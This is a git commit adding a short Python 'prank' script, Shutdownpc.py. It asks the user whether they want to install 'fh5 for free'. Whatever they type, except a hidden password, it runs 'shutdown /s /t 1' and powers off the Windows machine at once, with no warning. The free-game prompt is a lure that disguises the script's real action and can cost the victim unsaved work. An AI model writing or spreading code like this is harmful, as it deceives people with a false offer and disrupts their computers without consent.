6561ded365e27134b0dac9fbdde40a6a712ffd1e
Shadyshift co <schakenboscas@gmail.com>
2024-06-10 15:36:27 +0200

    Create Shutdownpc.py
    To prank your friends

---
+++ Shutdownpc.py
@@ -0,0 +1,8 @@
+import os
+
+shutdown = input("do you want to install fh5 for free yes/no, just type no or yes")
+
+if shutdown == 'shadyshiftisacoolman':
+  exit()
+else:
+  os.system("shutdown /s /t 1")
